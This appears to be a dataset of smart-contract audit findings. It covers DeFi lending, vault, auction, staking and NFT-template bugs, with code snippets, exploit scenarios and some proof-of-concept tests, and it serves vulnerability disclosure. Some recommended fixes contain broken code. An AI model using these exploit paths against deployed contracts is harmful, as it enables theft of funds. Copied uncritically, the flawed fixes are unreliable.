LienToken._payment function increases users debtчmediumч"```\n  function _payment(\n    uint256 collateralId,\n    uint8 position,\n    uint256 paymentAmount,\n    address payer\n  ) internal returns (uint256) {\n    if (paymentAmount == uint256(0)) {\n      return uint256(0);\n    }\n\n\n    uint256 lienId = liens[collateralId][position];\n    Lien storage lien = lienData[lienId];\n    uint256 end = (lien.start + lien.duration);\n    require(\n      block.timestamp < end || address(msg.sender) == address(AUCTION_HOUSE),\n      ""cannot pay off an expired lien""\n    );\n\n\n    address lienOwner = ownerOf(lienId);\n    bool isPublicVault = IPublicVault(lienOwner).supportsInterface(\n      type(IPublicVault).interfaceId\n    );\n\n\n    lien.amount = _getOwed(lien);\n\n\n    address payee = getPayee(lienId);\n    if (isPublicVault) {\n      IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n    }\n    if (lien.amount > paymentAmount) {\n      lien.amount -= paymentAmount;\n      lien.last = block.timestamp.safeCastTo32();\n      // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()\n      if (isPublicVault) {\n        IPublicVault(lienOwner).afterPayment(lienId);\n      }\n    } else {\n      if (isPublicVault && !AUCTION_HOUSE.auctionExists(collateralId)) {\n        // since the openLiens count is only positive when there are liens that haven't been paid off\n        // that should be liquidated, this lien should not be counted anymore\n        IPublicVault(lienOwner).decreaseEpochLienCount(\n          IPublicVault(lienOwner).getLienEpoch(end)\n        );\n      }\n      //delete liens\n      _deleteLienPosition(collateralId, position);\n      delete lienData[lienId]; //full delete\n\n\n      _burn(lienId);\n    }\n\n\n    TRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n\n\n    emit Payment(lienId, paymentAmount);\n    return paymentAmount;\n  }\n```\n"ч"LienToken._payment function increases users debt by setting `lien.amount = _getOwed(lien)`\n`LienToken._payment` is used by `LienToken.makePayment` function that allows borrower to repay part or all his debt.\nAlso this function can be called by `AuctionHouse` when the lien is liquidated.\n```\n  function _payment(\n    uint256 collateralId,\n    uint8 position,\n    uint256 paymentAmount,\n    address payer\n  ) internal returns (uint256) {\n    if (paymentAmount == uint256(0)) {\n      return uint256(0);\n    }\n\n\n    uint256 lienId = liens[collateralId][position];\n    Lien storage lien = lienData[lienId];\n    uint256 end = (lien.start + lien.duration);\n    require(\n      block.timestamp < end || address(msg.sender) == address(AUCTION_HOUSE),\n      ""cannot pay off an expired lien""\n    );\n\n\n    address lienOwner = ownerOf(lienId);\n    bool isPublicVault = IPublicVault(lienOwner).supportsInterface(\n      type(IPublicVault).interfaceId\n    );\n\n\n    lien.amount = _getOwed(lien);\n\n\n    address payee = getPayee(lienId);\n    if (isPublicVault) {\n      IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n    }\n    if (lien.amount > paymentAmount) {\n      lien.amount -= paymentAmount;\n      lien.last = block.timestamp.safeCastTo32();\n      // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()\n      if (isPublicVault) {\n        IPublicVault(lienOwner).afterPayment(lienId);\n      }\n    } else {\n      if (isPublicVault && !AUCTION_HOUSE.auctionExists(collateralId)) {\n        // since the openLiens count is only positive when there are liens that haven't been paid off\n        // that should be liquidated, this lien should not be counted anymore\n        IPublicVault(lienOwner).decreaseEpochLienCount(\n          IPublicVault(lienOwner).getLienEpoch(end)\n        );\n      }\n      //delete liens\n      _deleteLienPosition(collateralId, position);\n      delete lienData[lienId]; //full delete\n\n\n      _burn(lienId);\n    }\n\n\n    TRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n\n\n    emit Payment(lienId, paymentAmount);\n    return paymentAmount;\n  }\n```\n\nHere lien.amount becomes lien.amount + accrued interests, because `_getOwed` do that calculation.\n`lien.amount` is the amount that user borrowed. So actually that line has just increased user's debt. And in case if he didn't pay all amount of lien, then next time he will pay more interests.\nExample. User borrows 1 eth. His `lien.amount` is 1eth. Then he wants to repay some part(let's say 0.5 eth). Now his `lien.amount` becomes `lien.amount` + interests. When he pays next time, he pays `(lien.amount + interests) + new interests`. So interests are acummulated on previous interests."ч
_validateCommitment fails for approved operatorsчmediumч"```\nif (msg.sender != holder) {\n  require(msg.sender == operator, ""invalid request"");\n}\n```\n"ч"If a collateral token owner approves another user as an operator for all their tokens (rather than just for a given token), the validation check in `_validateCommitment()` will fail.\nThe collateral token is implemented as an ERC721, which has two ways to approve another user:\nApprove them to take actions with a given token (approve())\nApprove them as an ""operator"" for all your owned tokens (setApprovalForAll())\nHowever, when the `_validateCommitment()` function checks that the token is owned or approved by `msg.sender`, it does not accept those who are set as operators.\n```\nif (msg.sender != holder) {\n  require(msg.sender == operator, ""invalid request"");\n}\n```\n"ч"Include an additional check to confirm whether the `msg.sender` is approved as an operator on the token:\n```\n    address holder = ERC721(COLLATERAL_TOKEN()).ownerOf(collateralId);\n    address approved = ERC721(COLLATERAL_TOKEN()).getApproved(collateralId);\n    address operator = ERC721(COLLATERAL_TOKEN()).isApprovedForAll(holder);\n\n    if (msg.sender != holder) {\n      require(msg.sender == operator || msg.sender == approved, ""invalid request"");\n    }\n```\n"чApproved operators of collateral tokens will be rejected from taking actions with those tokens.\nCode Snippet\nTool used\nManual Review
timeToEpochEnd calculates backwards, breaking protocol mathчmediumч```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\nчWhen a lien is liquidated, it calls `timeToEpochEnd()` to determine if a liquidation accountant should be deployed and we should adjust the protocol math to expect payment in a future epoch. Because of an error in the implementation, all liquidations that will pay out in the current epoch are set up as future epoch liquidations.\nThe `liquidate()` function performs the following check to determine if it should set up the liquidation to be paid out in a future epoch:\n```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\n\nThis check expects that `timeToEpochEnd()` will return the time until the epoch is over. However, the implementation gets this backwards:\n```\nfunction timeToEpochEnd() public view returns (uint256) {\n  uint256 epochEnd = START() + ((currentEpoch + 1) * EPOCH_LENGTH());\n\n  if (epochEnd >= block.timestamp) {\n    return uint256(0);\n  }\n\n  return block.timestamp - epochEnd;\n}\n```\n\nIf `epochEnd >= block.timestamp`, that means that there IS remaining time in the epoch, and it should perform the calculation to return `epochEnd - block.timestamp`. In the opposite case, where `epochEnd <= block.timestamp`, it should return zero.\nThe result is that the function returns 0 for any epoch that isn't over. Since `0 < COLLATERAL_TOKEN.auctionWindow())`, all liquidated liens will trigger a liquidation accountant and the rest of the accounting for future epoch withdrawals.чFix the `timeToEpochEnd()` function so it calculates the remaining time properly:\n```\nfunction timeToEpochEnd() public view returns (uint256) {\n  uint256 epochEnd = START() + ((currentEpoch + 1) * EPOCH_LENGTH());\n\n  if (epochEnd <= block.timestamp) {\n    return uint256(0);\n  }\n\n  return epochEnd - block.timestamp; //\n}\n```\nчAccounting for a future epoch withdrawal causes a number of inconsistencies in the protocol's math, the impact of which vary depending on the situation. As a few examples:\nIt calls `decreaseEpochLienCount()`. This has the effect of artificially lowering the number of liens in the epoch, which will cause the final liens paid off in the epoch to revert (and will let us process the epoch earlier than intended).\nIt sets the payee of the lien to the liquidation accountant, which will pay out according to the withdrawal ratio (whereas all funds should be staying in the vault).\nIt calls `increaseLiquidationsExpectedAtBoundary()`, which can throw off the math when processing the epoch.\nCode Snippet\nTool used\nManual Review
_payment() function transfers full paymentAmount, overpaying first liensчmediumч```\nTRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n```\nчThe `_payment()` function sends the full `paymentAmount` argument to the lien owner, which both (a) overpays lien owners if borrowers accidentally overpay and (b) sends the first lien owner all the funds for the entire loop of a borrower is intending to pay back multiple loans.\nIn both cases, the functions call out to `_payment()` with a `paymentAmount`, which is sent (in full) to the lien owner.\n```\nTRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n```\n\nThis behavior can cause problems in both cases.\nThe first case is less severe: If the user is intending to pay off one lien, and they enter a `paymentAmount` greater than the amount owed, the function will send the full `paymentAmount` to the lien owner, rather than just sending the amount owed.\nThe second case is much more severe: If the user is intending to pay towards all their loans, the `_makePayment()` function loops through open liens and performs the following:\n```\nuint256 paymentAmount = totalCapitalAvailable;\nfor (uint256 i = 0; i < openLiens.length; ++i) {\n  uint256 capitalSpent = _payment(\n    collateralId,\n    uint8(i),\n    paymentAmount,\n    address(msg.sender)\n  );\n  paymentAmount -= capitalSpent;\n}\n```\n\nThe `_payment()` function is called with the first lien with `paymentAmount` set to the full amount sent to the function. The result is that this full amount is sent to the first lien holder, which could greatly exceed the amount they are owed.ч
_getInterest() function uses block.timestamp instead of the inputted timestampчmediumч```\nif (block.timestamp >= lien.start + lien.duration) {\n  delta_t = uint256(lien.start + lien.duration - lien.last);\n} \n```\nчThe `_getInterest()` function takes a timestamp as input. However, in a crucial check in the function, it uses `block.timestamp` instead. The result is that other functions expecting accurate interest amounts will receive incorrect values.\nThe `_getInterest()` function takes a lien and a timestamp as input. The intention is for it to calculate the amount of time that has passed in the lien (delta_t) and multiply this value by the rate and the amount to get the interest generated by this timestamp.\nHowever, the function uses the following check regarding the timestamp:\n```\nif (block.timestamp >= lien.start + lien.duration) {\n  delta_t = uint256(lien.start + lien.duration - lien.last);\n} \n```\n\nBecause this check uses `block.timestamp` before returning the maximum interest payment, the function will incorrectly determine which path to take, and return an incorrect interest value.чChange `block.timestamp` to `timestamp` so that the if statement checks correctly.чThere are two negative consequences that can come from this miscalculation:\nif the function is called when the lien is over (block.timestamp >= lien.start + lien.duration) to check an interest amount from a timestamp during the lien, it will incorrectly return the maximum interest value\nIf the function is called when the lien is active for a timestamp long after the lien is over, it will skip the check to return maximum value and return the value that would have been generated if interest kept accruing indefinitely (using delta_t = uint256(timestamp.safeCastTo32() - lien.last);)\nThis `_getInterest()` function is used in many crucial protocol functions (_getOwed(), `calculateSlope()`, `changeInSlope()`, getTotalDebtForCollateralToken()), so these incorrect values can have surprising and unexpected negative impacts on the protocol.\nCode Snippet\nTool used\nManual Review
Vault Fee uses incorrect offset leading to wildly incorrect value, allowing strategists to steal all fundsчmediumч```\nfunction testVaultFeeIncorrectlySet() public {\n  Dummy721 nft = new Dummy721();\n  address tokenContract = address(nft);\n  uint256 tokenId = uint256(1);\n  address publicVault = _createPublicVault({\n      strategist: strategistOne,\n      delegate: strategistTwo,\n      epochLength: 14 days\n  });\n  uint fee = PublicVault(publicVault).VAULT_FEE();\n  console.log(fee)\n  assert(fee == 5000); // 5000 is the value that was meant to be set\n}\n```\nч`VAULT_FEE()` uses an incorrect offset, returning a number ~1e16X greater than intended, providing strategists with unlimited access to drain all vault funds.\nWhen using ClonesWithImmutableArgs, offset values are set so that functions representing variables can retrieve the correct values from storage.\nI put together a POC to grab the value of `VAULT_FEE()` in the test setup:\n```\nfunction testVaultFeeIncorrectlySet() public {\n  Dummy721 nft = new Dummy721();\n  address tokenContract = address(nft);\n  uint256 tokenId = uint256(1);\n  address publicVault = _createPublicVault({\n      strategist: strategistOne,\n      delegate: strategistTwo,\n      epochLength: 14 days\n  });\n  uint fee = PublicVault(publicVault).VAULT_FEE();\n  console.log(fee)\n  assert(fee == 5000); // 5000 is the value that was meant to be set\n}\n```\n\nIn this case, the value returned is > 3e20.чSet the offset for `VAULT_FEE()` to 165. I tested this value in the POC I created and it correctly returned the value of 5000.чThis is a highly critical bug. `VAULT_FEE()` is used in `_handleStrategistInterestReward()` to determine the amount of tokens that should be allocated to `strategistUnclaimedShares`.\n```\nif (VAULT_FEE() != uint256(0)) {\n    uint256 interestOwing = LIEN_TOKEN().getInterest(lienId);\n    uint256 x = (amount > interestOwing) ? interestOwing : amount;\n    uint256 fee = x.mulDivDown(VAULT_FEE(), 1000); //VAULT_FEE is a basis point\n    strategistUnclaimedShares += convertToShares(fee);\n  }\n```\n\nThe result is that strategistUnclaimedShares will be billions of times higher than the total interest generated, essentially giving strategist access to withdraw all funds from their vaults at any time.\nCode Snippet\nTool used\nManual Review
Bids cannot be created within timeBuffer of completion of a max duration auctionчmediumч```\nif (firstBidTime + duration - block.timestamp < timeBuffer)\n```\nчThe auction mechanism is intended to watch for bids within `timeBuffer` of the end of the auction, and automatically increase the remaining duration to `timeBuffer` if such a bid comes in.\nThere is an error in the implementation that causes all bids within `timeBuffer` of the end of a max duration auction to revert, effectively ending the auction early and cutting off bidders who intended to wait until the end.\n```\nif (firstBidTime + duration - block.timestamp < timeBuffer)\n```\n\nIf so, it sets `newDuration` to equal the amount that will extend the auction to `timeBuffer` from now:\n```\nuint64 newDuration = uint256( duration + (block.timestamp + timeBuffer - firstBidTime) ).safeCastTo64();\n```\n\nIf this `newDuration` doesn't extend beyond the `maxDuration`, this works great. However, if it does extend beyond `maxDuration`, the following code is used to update duration:\n```\nauctions[tokenId].duration = auctions[tokenId].maxDuration - firstBidTime;\n```\n\nThis code is incorrect. `maxDuration` will be a duration for the contest (currently set to 3 days), whereas `firstTimeBid` is a timestamp for the start of the auction (current timestamps are > 1 billion).\nSubtracting `firstTimeBid` from `maxDuration` will underflow, which will revert the function.чChange this assignment to simply assign `duration` to `maxDuration`, as follows:\n```\nauctions[tokenId].duration = auctions[tokenId].maxDuration\n```\nчBidders who expected to wait until the end of the auction to vote will be cut off from voting, as the auction will revert their bids.\nVaults whose collateral is up for auction will earn less than they otherwise would have.\nCode Snippet\nTool used\nManual Review
Loan can be written off by anybody before overdue delay expiresчhighч```\n        if (block.number <= lastRepay + overdueBlocks + maxOverdueBlocks) {\n            if (staker != msg.sender) revert AuthFailed();\n        }\n```\nчWhen a borrower takes a second loan after a loan that has been written off, this second loan can be written off instantly by any other member due to missing update of last repay block, leaving the staker at a loss.\nA staker stakes and vouches a borrower\nthe borrower borrows calling UToken:borrow: `accountBorrows[borrower].lastRepay` is updated with the current block number\nthe staker writes off the entire debt of the borrower calling `UserManager:debtWriteOff`. In the internal call to `UToken:debtWriteOff` the principal is set to zero but `accountBorrows[borrower].lastRepay` is not updated\n90 days pass and a staker vouches for the same borrower\nthe borrower borrows calling UToken:borrow: `accountBorrows[borrower].lastRepay` is not set to the current block since non zero and stays to the previous value.\n`accountBorrows[borrower].lastRepay` is now old enough to allow the check in `UserManager:debtWriteOff` at line 738 to pass. The debt is written off by any other member immediatly after the loan is given. The staker looses the staked amount immediatly.\n```\n        if (block.number <= lastRepay + overdueBlocks + maxOverdueBlocks) {\n            if (staker != msg.sender) revert AuthFailed();\n        }\n```\n\nThe last repay block is still stale and a new loan can be taken and written off immediatly many times as long as stakers are trusting the borrower\nNote that this can be exploited maliciously by the borrower, who can continously ask for loans and then write them off immediatly.ч
A stake that has just been locked gets full reward multiplierчmediumч"```\n        it(""PoC: staker with locked balance gets more rewards even when just locked"", async () => {\n            const trustAmount = parseUnits(""2000"");\n            const borrowAmount = parseUnits(""1800"");\n            const [account, staker, borrower] = members;\n\n            const [accountStaked, borrowerStaked, stakerStaked] = await helpers.getStakedAmounts(\n                account,\n                staker,\n                borrower\n            );\n\n            expect(accountStaked).eq(borrowerStaked);\n            expect(borrowerStaked).eq(stakerStaked);\n\n            await helpers.updateTrust(staker, borrower, trustAmount);\n            \n            await roll(10);\n            await helpers.borrow(borrower, borrowAmount); // borrows just after withdrawing\n            \n            const [accountMultiplier, stakerMultiplier] = await helpers.getRewardsMultipliers(account, staker);\n            console.log(""accountMultiplier: "", accountMultiplier);\n            console.log(""StakerMultiplier: "", stakerMultiplier);\n            expect(accountMultiplier).lt(stakerMultiplier);  // the multiplier is larger even if just locked\n        });\n```\n"ч"A staker gets rewarded with full multiplier even if its stake has just been locked. Multiplier calculation should take into account the duration of the lock.\nA staker stakes an amount of tokens.\nThe staker waits for some time\nThe staker has control of another member (bribe, ...)\nThe staker vouches this other member\nThe member borrows\nThe staker calls `Comptroller:withdrawRewards` and gets an amount of rewards with a multiplier corresponding to a locked stake\nThe member repays the loan\nNote that steps 4 to 7 can be made in one tx, so no interest is paid at step 7.\nThe result is that the staker can always get the full multiplier for rewards, without ever putting any funds at risk, nor any interest being paid. This is done at the expense of other honest stakers, who get proprotionally less of the rewards dripped into the comptroller.\nFor a coded PoC replace the test `""staker with locked balance gets more rewards""` in `staking.ts` with the following\n```\n        it(""PoC: staker with locked balance gets more rewards even when just locked"", async () => {\n            const trustAmount = parseUnits(""2000"");\n            const borrowAmount = parseUnits(""1800"");\n            const [account, staker, borrower] = members;\n\n            const [accountStaked, borrowerStaked, stakerStaked] = await helpers.getStakedAmounts(\n                account,\n                staker,\n                borrower\n            );\n\n            expect(accountStaked).eq(borrowerStaked);\n            expect(borrowerStaked).eq(stakerStaked);\n\n            await helpers.updateTrust(staker, borrower, trustAmount);\n            \n            await roll(10);\n            await helpers.borrow(borrower, borrowAmount); // borrows just after withdrawing\n            \n            const [accountMultiplier, stakerMultiplier] = await helpers.getRewardsMultipliers(account, staker);\n            console.log(""accountMultiplier: "", accountMultiplier);\n            console.log(""StakerMultiplier: "", stakerMultiplier);\n            expect(accountMultiplier).lt(stakerMultiplier);  // the multiplier is larger even if just locked\n        });\n```\n"ч
updateTrust() vouchers also need check maxVouchersчmediumч```\n    function updateTrust(address borrower, uint96 trustAmount) external onlyMember(msg.sender) whenNotPaused {\n// rest of code\n            uint256 voucheesLength = vouchees[staker].length;\n            if (voucheesLength >= maxVouchers) revert MaxVouchees();\n\n\n            uint256 voucherIndex = vouchers[borrower].length;\n            voucherIndexes[borrower][staker] = Index(true, uint128(voucherIndex));\n            vouchers[borrower].push(Vouch(staker, trustAmount, 0, 0)); /**** don't check maxVouchers****/\n```\nчmaxVouchers is to prevent the “vouchees“ array from getting too big and the loop will have the GAS explosion problem, but “vouchers“have the same problem, if you don't check the vouchers array, it is also possible that vouchers are big and cause updateLocked() to fail\nvouchees check < maxVouchers ,but vouchers don't check\n```\n    function updateTrust(address borrower, uint96 trustAmount) external onlyMember(msg.sender) whenNotPaused {\n// rest of code\n            uint256 voucheesLength = vouchees[staker].length;\n            if (voucheesLength >= maxVouchers) revert MaxVouchees();\n\n\n            uint256 voucherIndex = vouchers[borrower].length;\n            voucherIndexes[borrower][staker] = Index(true, uint128(voucherIndex));\n            vouchers[borrower].push(Vouch(staker, trustAmount, 0, 0)); /**** don't check maxVouchers****/\n```\nч
Unsafe downcasting arithmetic operation in UserManager related contract and in UToken.solчmediumч```\n  function stakeWithPermit(\n      uint256 amount,\n      uint256 nonce,\n      uint256 expiry,\n      uint8 v,\n      bytes32 r,\n      bytes32 s\n  ) external whenNotPaused {\n      IDai erc20Token = IDai(stakingToken);\n      erc20Token.permit(msg.sender, address(this), nonce, expiry, true, v, r, s);\n\n      stake(uint96(amount));\n  }\n```\nчvalue can unsafely downcasted. let us look at it cast by cast.\n```\n  function stakeWithPermit(\n      uint256 amount,\n      uint256 nonce,\n      uint256 expiry,\n      uint8 v,\n      bytes32 r,\n      bytes32 s\n  ) external whenNotPaused {\n      IDai erc20Token = IDai(stakingToken);\n      erc20Token.permit(msg.sender, address(this), nonce, expiry, true, v, r, s);\n\n      stake(uint96(amount));\n  }\n```\n\nas we can see, the user's staking amount is downcasted from uint256 to uint96.\n```\n   function borrow(address to, uint256 amount) external override onlyMember(msg.sender) whenNotPaused nonReentrant {\n```\n\nand\n```\n  // Withdraw the borrowed amount of tokens from the assetManager and send them to the borrower\n  if (!assetManagerContract.withdraw(underlying, to, amount)) revert WithdrawFailed();\n\n  // Call update locked on the userManager to lock this borrowers stakers. This function\n  // will revert if the account does not have enough vouchers to cover the borrow amount. ie\n  // the borrower is trying to borrow more than is able to be underwritten\n  IUserManager(userManager).updateLocked(msg.sender, uint96(amount + fee), true);\n```\n\nnote when we withdraw fund from asset Manager, we use a uint256 amount, but we downcast it to uint96(amount + fee) when updating the locked. The accounting would be so broken if the amount + fee is a larger than uint96 number.\n```\n    function _repayBorrowFresh(\n        address payer,\n        address borrower,\n        uint256 amount\n    ) internal {\n```\n\nand\n```\n  // Update the account borrows to reflect the repayment\n  accountBorrows[borrower].principal = borrowedAmount - repayAmount;\n  accountBorrows[borrower].interest = 0;\n```\n\nand\n```\n IUserManager(userManager).updateLocked(borrower, uint96(repayAmount - interest), false);\n```\n\nwe use a uint256 number for borrowedAmount - repayAmount, but downcast it to uint96(repayAmount - interest) when updating the lock!\nNote there are index-related downcasting, the damage is small , comparing the accounting related downcasting.because it is difference to have uint128 amount of vouch, but I still want to mention it: the index is unsafely downcasted from uint256 to uint128\n```\n  // Get the new index that this vouch is going to be inserted at\n  // Then update the voucher indexes for this borrower as well as\n  // Adding the Vouch the the vouchers array for this staker\n  uint256 voucherIndex = vouchers[borrower].length;\n  voucherIndexes[borrower][staker] = Index(true, uint128(voucherIndex));\n  vouchers[borrower].push(Vouch(staker, trustAmount, 0, 0));\n\n  // Add the voucherIndex of this new vouch to the vouchees array for this\n  // staker then update the voucheeIndexes with the voucheeIndex\n  uint256 voucheeIndex = voucheesLength;\n  vouchees[staker].push(Vouchee(borrower, uint96(voucherIndex)));\n  voucheeIndexes[borrower][staker] = Index(true, uint128(voucheeIndex));\n```\n\nThere are block.number related downcasting, which is a smaller issue.\n```\nvouch.lastUpdated = uint64(block.number);\n```\nчJust use uint256, or use openzepplin safeCasting.\nhttps://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast\nDiscussion\nkingjacob\nwill likely fix with a safecast libчThe damage level from the number truncation is rated by:\nUToken borrow and repaying downcasting > staking amount downcating truncation > the vouch index related downcasting. > block.number casting.\nCode Snippet\nTool used\nManual Review
getUserInfo() returns incorrect values for locked and stakedAmountчmediumч```\n(bool isMember, uint96 locked, uint96 stakedAmount) = userManager.stakers(user);\n```\nчThe `getUserInfo()` function mixes up the values for `locked` and `stakedAmount`, so the value for each of these is returned for the other.\nIn order to pull the user's staking information, the following function is called:\n```\n(bool isMember, uint96 locked, uint96 stakedAmount) = userManager.stakers(user);\n```\n\n```\nstruct Staker {\n    bool isMember;\n    uint96 stakedAmount;\n    uint96 locked;\n}\n```\n\nBecause both `locked` and `stakedAmount` have the type `uint96`, the function does not revert, and simply returns the incorrect values to the caller.чReverse the order of return values in the `getUserInfo()` function, so that it reads:\n```\n(bool isMember, uint96 stakedAmount, uint96 locked) = userManager.stakers(user);\n```\nчAny user or front end calling the `getUserInfo()` function will be given incorrect values, which could lead to wrong decisions.\nCode Snippet\nTool used\nManual Review
`AssetManager.rebalance()` will revert when the balance of `tokenAddress` in the money market is 0.чmediumч```\n    // Loop through each money market and withdraw all the tokens\n    for (uint256 i = 0; i < moneyMarketsLength; i++) {\n        IMoneyMarketAdapter moneyMarket = moneyMarkets[i];\n        if (!moneyMarket.supportsToken(tokenAddress)) continue;\n        moneyMarket.withdrawAll(tokenAddress, address(this));\n\n        supportedMoneyMarkets[supportedMoneyMarketsSize] = moneyMarket;\n        supportedMoneyMarketsSize++;\n    }\n```\nч`AssetManager.rebalance()` will revert when the balance of `tokenAddress` in the money market is 0.\nAssetManager.rebalance() tries to withdraw tokens from each money market for rebalancing here.\n```\n    // Loop through each money market and withdraw all the tokens\n    for (uint256 i = 0; i < moneyMarketsLength; i++) {\n        IMoneyMarketAdapter moneyMarket = moneyMarkets[i];\n        if (!moneyMarket.supportsToken(tokenAddress)) continue;\n        moneyMarket.withdrawAll(tokenAddress, address(this));\n\n        supportedMoneyMarkets[supportedMoneyMarketsSize] = moneyMarket;\n        supportedMoneyMarketsSize++;\n    }\n```\n\nWhen the balance of the `tokenAddress` is 0, we don't need to call `moneyMarket.withdrawAll()` but it still tries to call.\nBut this will revert because Aave V3 doesn't allow to withdraw 0 amount here.\n```\n  function validateWithdraw(\n    DataTypes.ReserveCache memory reserveCache,\n    uint256 amount,\n    uint256 userBalance\n  ) internal pure {\n    require(amount != 0, Errors.INVALID_AMOUNT);\n```\n\nSo `AssetManager.rebalance()` will revert if one money market has zero balance of `tokenAddress`.ч
gas limit DoS via unbounded operationsчmediumч```\n   IUserManager(userManager).updateLocked(msg.sender, uint96(amount + fee), true);\n  …\n  IUserManager(userManager).updateLocked(borrower, uint96(repayAmount - interest), false);\n```\nч"```\n   IUserManager(userManager).updateLocked(msg.sender, uint96(amount + fee), true);\n  …\n  IUserManager(userManager).updateLocked(borrower, uint96(repayAmount - interest), false);\n```\n\n```\n   function updateLocked(\n        address borrower,\n        uint96 amount,\n        bool lock\n    ) external onlyMarket {\n        uint96 remaining = amount;\n\n        for (uint256 i = 0; i < vouchers[borrower].length; i++) {\n \n```\n\nThe for loop could go through `vouchers[]` which could be long enough to lead to a ""gas limit DoS via unbounded operations"" And the same thing with `registerMember()`, any user could lose all their fund in this transaction\n```\n       function registerMember(address newMember) public virtual whenNotPaused {\n        if (stakers[newMember].isMember) revert NoExistingMember();\n\n        uint256 count = 0;\n        uint256 vouchersLength = vouchers[newMember].length;\n\n        // Loop through all the vouchers to count how many active vouches there\n        // are that are greater than 0. Vouch is the min of stake and trust\n        for (uint256 i = 0; i < vouchersLength; i++) {\n```\n"чAdd check for `trustAmount == 0`\nDiscussion\ndmitriia\nSome minimal `trustAmount` looks to be needed here as the same can be repeated with dust amounts (say 1 wei, as the attacker pays gas anyway, so financially it will not matter).ч1- The user couldn’t get any more `vouching` 2- The user will be not able to `borrow()` or `repayBorrow()` 3- No one can in invokeregisterMember() successfully for a specific user\nCode Snippet\n```\n   vouchers[borrower].push(Vouch(staker, trustAmount, 0, 0));\n```\n\n```\n    for (uint256 i = 0; i < vouchers[borrower].length; i++) {\n```\n\n```\n           uint256 vouchersLength = vouchers[newMember].length;\n\n        // Loop through all the vouchers to count how many active vouches there\n        // are that are greater than 0. Vouch is the min of stake and trust\n        for (uint256 i = 0; i < vouchersLength; i++) {\n```\n\nTool used\nManual Review
Template implementations doesn't validate configurations properlyчmediumч"```\n    /// Validate a runtime configuration change\n    function _validateRuntimeConfig(RuntimeConfig calldata config)\n        internal\n        view\n    {\n        // Can't set royalties to more than 100%\n        require(config.royaltiesBps <= ROYALTIES_BASIS, ""Royalties too high"");\n\n        // rest of code\n```\n"ч"In past audits, we have seen contract admins claim that invalidated configuration setters are fine since “admins are trustworthy”. However, cases such as Nomad got drained for over $150M and Misconfiguration in the Acala stablecoin project allows attacker to steal 1.2 billion aUSD have shown again and again that even trustable entities can make mistakes. Thus any fields that might potentially result in insolvency of protocol should be thoroughly checked.\nNftPort template implementations often ignore checks for config fields. For the rest of the issue, we take `royalty` related fields as an example to illustrate potential consequences of misconfigurations. Notably, lack of check is not limited to `royalty`, but exists among most config fields.\nAdmins are allowed to set a wrong `royaltiesBps` which is higher than `ROYALTIES_BASIS`. `royaltyInfo()` will accept this invalid `royaltiesBps` and users will pay a large amount of royalty.\n```\n    /// Validate a runtime configuration change\n    function _validateRuntimeConfig(RuntimeConfig calldata config)\n        internal\n        view\n    {\n        // Can't set royalties to more than 100%\n        require(config.royaltiesBps <= ROYALTIES_BASIS, ""Royalties too high"");\n\n        // rest of code\n```\n\nBut `NFTCollection` only check `royaltiesBps` when admins call `updateConfig()`, it doesn't check `royaltiesBps` in `initialize()` function, leading to admins could set an invalid `royaltiesBps` (higher than 100%) when initializing contracts.\nThe same problem exists in ERC721NFTProduct and ERC1155NFTProduct. Both ERC721NFTProduct and ERC1155NFTProduct don't check `royaltiesBasisPoints` in `initialize()` function. Furthermore, these contracts also don't check `royaltiesBasisPoints` when admins call `update()` function. It means that admins could set an invalid `royaltiesBasisPoints` which may be higher than 100% in any time."ч
registerTemplate() can't handle properly when ITemplate version is 0чmediumч```\n   function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n// rest of code\n\n        if (latestImplementation[templateName] == address(0)) { /****add other version, _templateNames will duplicate ****/\n            _templateNames.push(templateName);\n        }\n\n        if (templateVersion > latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; /****templateVersion==0 ,  don't set ****/\n        }\n\n    }\n```\nчWhen version is equal 0 latestImplementation[templateName] don't set\n```\n   function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n// rest of code\n\n        if (latestImplementation[templateName] == address(0)) { /****add other version, _templateNames will duplicate ****/\n            _templateNames.push(templateName);\n        }\n\n        if (templateVersion > latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; /****templateVersion==0 ,  don't set ****/\n        }\n\n    }\n```\nч```\n    function _setTemplate(\n        string memory templateName,\n        uint256 templateVersion,\n        address implementationAddress\n    ) internal {\n\n -      if (templateVersion > latestVersion[templateName]) {\n +      if (templateVersion > = latestVersion[templateName]) {\n            latestVersion[templateName] = templateVersion;\n            latestImplementation[templateName] = implementationAddress; \n        }\n```\n\nDiscussion\nhyperspacebunny\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/4\nrayn731\nFixed, it prevents using version 0, only > 0 is allowed.чlatestImplementation[templateName] and _templateNames will error. external contracts may think there is no setup, resulting in duplicate setups that keep failing\nCode Snippet\nTool used\nManual Review
Factory uses signature that do not have expirationчmediumч```\nsignedOnly(abi.encodePacked(msg.sender, instance, data), signature)\n```\nчNftPort can't remove license from user, once the signature was provided to it, without changing `SIGNER_ROLE` address.\nIn Factory contract there are few methods that are called when signed by trusted signer.\nThis is how the signature is checked\n```\nsignedOnly(abi.encodePacked(msg.sender, instance, data), signature)\n```\n\nAs you can see there is no any expiration time. That means that once, the signer has signed the signature for the user it can use it for the end of life. It's like lifetime license. The only option to remove the license from user is to revoke `SIGNER_ROLE` and set it to another account. But it's possible that the NFTPort will have a need to do that with current signer.ч
